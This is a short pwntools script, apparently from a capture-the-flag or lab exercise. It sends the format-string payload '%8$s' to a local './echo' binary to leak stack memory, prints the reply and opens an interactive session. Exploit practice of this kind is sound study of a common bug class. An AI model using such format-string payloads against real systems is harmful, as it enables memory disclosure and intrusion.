'''
Author: Samrito
Date: 2022-02-09 17:09:19
LastEditors: Samrito
LastEditTime: 2022-02-09 17:11:52
'''
from sys import argv
from pwn import *

context.arch = 'i386'
context.os = 'linux'
context.log_level = 'debug'

io = process(argv=['./echo'])

io.recvuntil(b'> ')
io.sendline(b'%8$s')
res = io.recvline()
print(res)
io.interactive()